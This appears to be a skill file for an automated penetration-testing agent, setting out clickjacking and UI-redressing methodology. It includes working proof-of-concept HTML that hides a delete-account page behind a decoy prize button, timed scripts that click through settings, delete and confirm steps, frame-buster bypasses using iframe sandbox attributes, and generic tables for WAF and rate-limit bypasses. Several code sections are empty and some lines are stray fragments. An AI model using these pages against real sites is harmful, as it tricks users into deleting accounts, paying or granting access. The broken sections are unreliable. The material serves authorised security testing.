---

name: web-19-clickjacking
sequence: web-19
category: xss
domain: web
description: "Clickjacking and UI redressing testing skill for offensive security. Covers missing X-Frame-Options, CSP frame-ancestors bypass, drag-and-drop hijacking, multi-step clickjacking, and mobile-specific framing attacks. Use when testing for clickjacking vulnerabilities."
wordlist_ref: "wordlists/web/web-30-clickjacking/"
---

# Clickjacking & UI Redressing — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Test for clickjacking (UI redress) vulnerabilities — missing X-Frame-Options / CSP frame-ancestors allowing sensitive pages to be embedded in iframes on attacker-controlled domains.

## OWASP Mapping
- A05:2021 Security Misconfiguration
- CWE-1021: Improper Restriction of Rendered UI Layers or Frames
- CWE-693: Protection Mechanism Failure

## Vulnerability Classes

### 1. Missing X-Frame-Options
**Detection:**
- No `X-Frame-Options` header in response
- AND no `Content-Security-Policy: frame-ancestors` directive

**Impact levels by page type:**
- Account deletion (`/account/delete`, `/settings/delete-account`) → CRITICAL
- Sensitive account modification (`/settings/password`, `/account/email`) → CRITICAL
- Payment/financial (`/payment/*`, `/checkout/*`, `/transfer/*`) → CRITICAL
- Admin/privilege actions (`/admin/*`, `/manage/*`) → CRITICAL
- OAuth authorization (`/oauth/authorize`, `/oauth/grant`) → HIGH
- Login/logout pages → HIGH (credential capture)
- Profile/settings modification → MEDIUM
- Public homepage → LOW (read-only)

**PoC HTML Generation — every frameable sensitive page must include generated `poc_html`:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body { margin: 0; overflow: hidden; }
        .decoy { position: absolute; top: 20px; left: 20px; font-family: Arial; }
        .decoy button { padding: 15px 30px; font-size: 18px; background: #4CAF50; color: white; border: none; cursor: pointer; }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.001;          /* invisible but interactive */
            z-index: 999;
            border: none;
        }
    </style>
</head>
<body>
    <div class="decoy">
        <h2>Click to claim your prize!</h2>
        <button>Click Here</button>
    </div>
    <iframe src="https://target.com/settings/delete-account" frameborder="0"></iframe>
</body>
</html>
```

**Stored in finding:** `evidence.poc_html` field contains self-contained, executable HTML page demonstrating framability.

### 2. CSP frame-ancestors Analysis Matrix
**Protection levels by CSP directive:**

| CSP frame-ancestors | Vulnerability | Notes |
|-------------------|---|---|
| `frame-ancestors 'none'` | SAFE | Page cannot be framed |
| `frame-ancestors 'self'` | SAFE | Only same-origin framing (unless subdomain trust issues) |
| `frame-ancestors 'self' https://trusted.com` | SAFE | Whitelist approach |
| `frame-ancestors https://trusted.com` | SAFE | Explicit whitelist only |
| `frame-ancestors https:` | VULNERABLE | Allows ANY HTTPS origin |
| `frame-ancestors https: http:` | VULNERABLE | Allows ANY origin (both protocols) |
| `frame-ancestors *` | VULNERABLE | Allows framing from anywhere |
| Missing CSP + X-Frame-Options missing | VULNERABLE | No frame protection |

**Precedence rule:** CSP `frame-ancestors` takes precedence over `X-Frame-Options`. If both present and CSP is missing `frame-ancestors`, fall back to X-Frame-Options evaluation.

**Subdomain trust chain risk:** `frame-ancestors 'self'` is SAFE unless there are subdomain takeover risks (→ chain to web-21-subdomain-takeover).

### 3. X-Frame-Options ALLOW-FROM Bypass
**ALLOW-FROM header:**
```
X-Frame-Options: ALLOW-FROM https://trusted.com
```
- Deprecated and not standardized; only some browsers respect it
- **Chrome behavior:** Ignores ALLOW-FROM entirely, falls back to allowing framing
- **Firefox/Safari:** May respect ALLOW-FROM
- **Result:** Chrome users vulnerable despite header presence

**Detection:** Confirm ALLOW-FROM presence + test framability in Chrome

### 4. HTML PoC Generator Spec
**Purpose:** Generate self-contained HTML page demonstrating clickjacking for proof-of-concept.

**Requirements:**
1. **Minimal but valid HTML:** DOCTYPE, html, head, body tags
2. **Overlay button:** Decoy button/link with attractive text (e.g., "Claim Prize", "Download Now")
3. **Invisible iframe:** opacity:0.001 (visible enough for screenshot, invisible to user), z-index:999 (on top)
4. **Target URL parameterized:** iframe src = sensitive page URL from discovery
5. **No external resources:** Fully self-contained (no external CSS/JS imports)
6. **Output format:** Base64-encoded or raw HTML string in `evidence.poc_html`

**Generator implementation:**


### 5. Auth-State Differentiation
**Detection approach:**
1. **Test unauthenticated first:** GET sensitive_page (no cookies/auth headers)
   - If 302 redirect to login → page is auth-gated
   - If 200 OK frameable → page is public (lower severity)
2. **Test authenticated:** GET sensitive_page (with session_cookies + auth_headers from SessionAcquirer)
   - If 200 OK frameable → confirmed clickjacking on sensitive authenticated page (CRITICAL)
   - If 302 redirect → issue with session (log as "auth-gated, cannot confirm")

**Severity adjustment:**
- Frameable + unauthenticated + sensitive = MEDIUM (attacker must pre-authenticate or social engineer session)
- Frameable + authenticated = CRITICAL (directly exploitable)
- 302 redirect auth-gated = Document in finding with note: "Page requires authentication; cannot confirm clickjacking without valid session. Re-test with authenticated session for full assessment."

### 6. Sensitive Page Detection Logic
**Multi-signal detection:**

**Signal 1: URL path keywords** (scoring):


**Signal 2: Content analysis** (on successful fetch):


**Combined severity:** max(url_score, content_score)

### 7. Double-Frame Bypass Test
**Attack vector:** X-Frame-Options SAMEORIGIN can sometimes be bypassed by nesting frames.

**Test sequence: web-19


### 8. CSS pointer-events Bypass
**Attack vector:** CSS `pointer-events: none` allows clicks to pass through element to element below.

**Technique:**
```css
.transparent-overlay {
    pointer-events: none;  /* Clicks pass through */
    opacity: 0.5;          /* Faintly visible or invisible */
    z-index: 999;
}
```

**Detection difficulty:** HIGH
- No HTTP header to detect
- Requires rendering engine (browser automation) to verify
- Not testable via ZAP send_request directly
- **Limitation:** Document as "CSS pointer-events bypass not testable via API — requires browser automation"

**If browser automation available (Playwright):**


### 9. Mobile Touch Event Clickjacking
**Browser-specific behavior:**

| Browser | Touch event handling | XFO/CSP enforcement |
|---------|---|---|
| Chrome Android | touchstart/touchend cross-frame | Respects X-Frame-Options |
| Safari iOS | Limited cross-frame touch | Respects X-Frame-Options |
| Firefox Android | touchstart/touchend cross-frame | Respects X-Frame-Options |

**Attack vector:** Invisible iframe + touch events might bypass frame protection on some mobile browsers.

**Detection approach:**
- Document as "Mobile touch event clickjacking not testable via desktop ZAP API"
- Note in finding: "If target serves mobile app (responsive UI), touch events may bypass X-Frame-Options on iOS/Android browsers"

### 10. Multi-Step Clickjacking Sequence
**Attack spec:** Chain multiple iframe interactions to complete multi-step workflow.

**Example workflow:**
```html
<!-- Step 1: Click "Settings" (overlaid) -->
<button onclick="frames[0].location.href='/settings'">Go to Settings</button>

<!-- Step 2: After delay, click "Delete" (overlaid) -->
<script>
setTimeout(() => {
    frames[0].document.querySelector('[data-action=delete]').click();
}, 1000);
</script>

<!-- Step 3: Confirm deletion -->
<script>
setTimeout(() => {
    frames[0].document.querySelector('[data-confirm=true]').click();
}, 2000);
</script>

<iframe src="https://target.com/dashboard"></iframe>
```

**Detection approach:**
- Discover multi-step forms via web-02-crawler (forms with multiple submit steps)
- Test first page frameable (basic test)
- Note in finding: "Multi-step clickjacking requires attacker to understand workflow; test confirms framability of initial page"

### 11. Drag-and-Drop Jacking
**Browser behavior:** Some browsers allow drag-and-drop across frame boundaries.

**Attack vector:** Victim drags element from decoy page → action triggered on framed target page.

**Detection:** Browser automation only (not testable via ZAP)
- **Limitation:** Document as "Drag-and-drop jacking not testable via API scanning — requires browser automation (Playwright)"
- If browser automation available:


### 12. Keyjacking
**Attack vector:** Hidden iframe captures keyboard input.

**Browser behavior:** Cross-frame keyboard capture generally blocked by modern browsers (SOP).

**Detection:** Browser automation only
- **Limitation:** "Keyjacking not testable via API scanning — requires browser automation"
- Modern browsers enforce Same-Origin Policy on keyboard events
- Document: "Keyjacking mitigated by modern SOP enforcement; low risk if no other auth vulnerabilities"

### 12b. Frame-Buster Bypass Testing (Gap Fix #8)
**Description:** Many pages implement frame-buster scripts (`if (top !== self) top.location = self.location`) to prevent framing. However, these can be bypassed using the `sandbox` attribute on the iframe.

**Frame-buster patterns to detect:**
```javascript
// Common frame-buster scripts:
if (top !== self) top.location = self.location;
if (window.top !== window.self) window.top.location = window.location;
if (self != top) { top.location = self.location; }
if (parent.frames.length > 0) { parent.location = self.location; }
```

**Bypass via sandbox attribute:**
```html
<!-- sandbox="allow-forms" prevents top-level navigation → frame-buster ineffective -->
<iframe src="https://target.com/sensitive-page"
        sandbox="allow-forms allow-scripts"></iframe>

<!-- Most effective: allow-scripts but NOT allow-top-navigation -->
<iframe src="https://target.com/settings/delete"
        sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
```

**Detection methodology:**
1. **Phase 1:** Check if page contains frame-buster script (grep JS for `top.location`, `self.location`, `parent.location`)
2. **Phase 3 Tier 3:** Test direct framing (standard test)
3. **Phase 3 Tier 4:** If frame-buster detected → test with `sandbox="allow-forms allow-scripts"` attribute
4. **Compare:** If page is frameable with sandbox but not without → frame-buster bypass confirmed

**Limitation note:** Full frame-buster bypass testing requires browser automation (Playwright) for JS execution confirmation. API-level testing can detect frame-buster presence and test sandbox attribute behavior via header analysis.

### 12c. Multi-Step Clickjacking Chain Testing (Gap Fix #8)
**Description:** Complex workflows requiring 2+ user interactions (e.g., click "Settings" → click "Delete" → click "Confirm") can be chained via timed iframe navigation.

**Multi-step attack sequence (3-click example):**
```html
<iframe id="f" src="https://target.com/dashboard" style="opacity:0.001;z-index:999;"></iframe>
<script>
// Step 1 (T+0s): Victim clicks "Settings"
setTimeout(() => {
    document.getElementById('f').contentWindow.document.querySelector('[href="/settings"]').click();
}, 500);
// Step 2 (T+2s): Victim clicks "Delete Account"
setTimeout(() => {
    document.getElementById('f').contentWindow.document.querySelector('[data-action="delete"]').click();
}, 2500);
// Step 3 (T+5s): Victim clicks "Confirm"
setTimeout(() => {
    document.getElementById('f').contentWindow.document.querySelector('#confirm-delete-btn').click();
}, 5500);
</script>
```

**Detection methodology:**
1. From web-02-crawler, identify multi-step forms (sequential navigation patterns)
2. Confirm each page in the workflow is frameable (standard clickjacking test per page)
3. Test cross-origin navigation within iframe (may be blocked by SOP)
4. Document: If all steps are frameable → multi-step clickjacking is viable

### 13. Frameable Redirects and Meta-Refresh
**Attack vector:** Page redirects (302, 301) or meta-refresh within iframe.

**Detection:**


---

## Sensitive Pages to Test (Priority Order)
```
1. /account/delete, /settings/delete-account
2. /settings/password, /account/change-password  
3. /account/email, /settings/email-change
4. /admin/*, /manage/*, /dashboard/*
5. /payment/*, /checkout/*, /billing/*
6. /transfer/*, /send-money/*
7. /oauth/authorize, /oauth/grant
8. /settings/*, /account/settings/*
9. /login, /signin
10. /api/*/confirm, /api/*/approve
```

---

# STEP 1: Discover sensitive pages from discovered_urls + crawl extensions
# From web-02-crawler output
# Additional targeted crawl for common sensitive paths
# Sort by sensitivity (highest first)
# STEP 2: Test each sensitive page for frame protection headers
# STEP 5: Run nuclei for additional detection
# PHASE 1 VERDICT
# cli_confirmed: score >= 3 and at least 1 sensitive frameable page
# cli_potential: score >= 1 but < 3
# clean: score == 0
# ZAP alerts for clickjacking:
# - "X-Frame-Options Header Not Set"
# - "Missing Anti-clickjacking Header"
# - "Content Security Policy (CSP) frame-ancestors directive not present"
# Score ZAP alerts
# Phase 3 tests framability more rigorously
# PHASE 3 VERDICT
## Attack Surface (Parameter Matrix)

| Surface | Clickjacking Tests |
|---------|-------------------|
| Security headers | X-Frame-Options, CSP frame-ancestors |
| All sensitive pages | Account management, payments, admin |
| Login/logout pages | Credential capture |
| OAuth authorization | OAuth clickjacking |
| API confirmation endpoints | Confirm/approve actions |
| Multi-step workflows | Payment confirmations |

---

## HackerOne Report Patterns

**Pattern 1: Account deletion via clickjacking (H1 #368542 type)**
`/account/delete` lacks X-Frame-Options. Attacker creates page with transparent iframe over "Click here to win" button → victim clicks → account deleted.

**Pattern 2: OAuth authorization clickjacking (H1 multiple)**
OAuth consent page (`/oauth/authorize`) frameable → attacker overlays "Allow" button → victim unknowingly grants OAuth permissions to attacker's app.

**Pattern 3: Password change clickjacking chain**
`/settings/password` frameable without CSRF token → combined clickjacking (form fill) + multi-click → password changed to attacker's value.

**Pattern 4: Payment confirmation clickjacking**
Payment confirmation page frameable → victim clicks "Order pizza" → actually clicking "Confirm payment" on target site.

---

## Zero-Day Research Hooks

### Novel Clickjacking Vectors

**1. CSS-based overlay (pointer-events bypass):**
- Decoy overlay with `pointer-events: none` allows clicks to pass through
- Not detectable via HTTP inspection alone
- Requires browser automation (Playwright) to verify
- **Status:** Not testable via ZAP API

**2. SVG-based framing:**
```xml
<svg>
  <foreignObject width="100%" height="100%">
    <iframe src="target.com/delete"></iframe>
  </foreignObject>
</svg>
```
- Some browsers may not apply X-Frame-Options to SVG foreignObject
- **Detection:** Test SVG wrapper responses for XFO header

**3. Data URL iframe:**
```html
<iframe src="data:text/html,<iframe src='https://target.com/delete'></iframe>"></iframe>
```
- Nested data-URL frames may bypass X-Frame-Options
- **Detection:** Enumerate data: URL framability tests

**4. Timing-based clickjacking (race condition):**
- Page loads frameable → attacker navigates to sensitive action mid-load
- Race condition between page load and navigation
- **Detection:** Automated browser tests with precise timing

**5. History/back-button jacking:**
- Attacker creates redirect loop → victim hits back button → lands on framed action
- **Detection:** Test if pages with redirects/redirects preserve framability

**6. Service Worker interception:**
- Service Worker intercepts fetch requests from framed page
- Attacker's SW modifies requests → clickjacking without visible iframe
- **Detection:** Check for Service Worker registration; test if SW can intercept cross-origin requests

**7. Cross-origin iframe with blob URL:**
```javascript
const html = '<iframe src="https://target.com/delete"></iframe>';
const blob = new Blob([html], { type: 'text/html' });
const blobUrl = URL.createObjectURL(blob);
```
- Blob URL may inherit different security context
- **Detection:** Browser automation only

**8. PDF embedded iframe:**
- PDF viewer may allow framing targets referenced in PDF
- **Detection:** If PDF upload/viewer present, test PDF iframe embedding

---

## False Positive Mitigation
- Only flag pages with actual user-initiated actions (not read-only pages)
- Prioritize: account deletion > password change > payment > profile change > read-only
- Distinguish between missing X-Frame-Options on homepage (low risk) vs settings page (high risk)
- Confirm CSP frame-ancestors is also missing — not just X-Frame-Options

---




## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-30-clickjacking/`

**Files**:
- `wordlists/web/web-30-clickjacking/payloads/clickjacking/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

